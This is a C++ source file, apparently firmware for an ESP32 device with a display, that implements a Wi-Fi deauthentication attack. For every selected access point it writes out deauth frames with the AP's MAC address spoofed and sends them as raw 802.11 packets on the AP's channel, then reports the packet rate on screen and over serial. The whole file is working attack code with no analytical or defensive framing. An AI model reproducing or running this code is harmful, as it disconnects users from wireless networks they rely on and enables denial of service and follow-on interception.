#include "attack.h"

Attack attack;

void Attack::deauthUpdate(){
	if(deauth_attack && millis()-lastPacketTime > 10){
        deauthedDevice = 0;
        
		for (size_t i = 0; i < scan.APs_count; i++)
		{
			if (scan.AP_list[i].selected == true)
			{     
				deauthDevice(i);
                deauthedDevice++;
			}
		}
        if (deauthedDevice == 0)
        {
            display.clearDisplay();
            display.setCursor(4, 29);
            display.print("no selected networks");
            display.display();
            delay(1000);

            disp.menu_level = 0;
            deauth_attack = 0;
            disp.drawMenu();
            return;
        }
        
        curentPacketTime = millis();

        Serial.println(curentPacketTime);
        Serial.println(lastPacketTime);
        Serial.println(curentPacketTime - lastPacketTime);
        Serial.println(deauthedDevice);

        curentPacketSpeed = deauthedDevice/((curentPacketTime-lastPacketTime)/1000.0f);

        Serial.printf("Speed%.2fpkt/s\n", curentPacketSpeed);

        if (curentPacketSpeed != lastPacketSpeed)
        {
            lastPacketSpeed = curentPacketSpeed;
            disp.drawDeauthInfo(deauthedDevice, curentPacketSpeed);
        }

        Serial.println("ZZZ");
        lastPacketTime = millis();
	}
}

bool Attack::deauthDevice(uint8_t num) {
    bool success = false;

    // build deauth packet
    packetSize = sizeof(deauthPacket);

    uint8_t deauthpkt[packetSize];

    memcpy(deauthpkt, deauthPacket, packetSize);


    memcpy(&deauthpkt[10], scan.AP_list[num].mac, 6);
    memcpy(&deauthpkt[16], scan.AP_list[num].mac, 6);
    deauthpkt[24] = 2;

    // send deauth frame
    deauthpkt[0] = 0xc0;

    if (sendPacket(deauthpkt, packetSize, scan.AP_list[num].channel)) {
        success = true;
    }



    return success;
}

bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch) {
	esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    return esp_wifi_80211_tx(WIFI_IF_AP, packet, packetSize, false);
}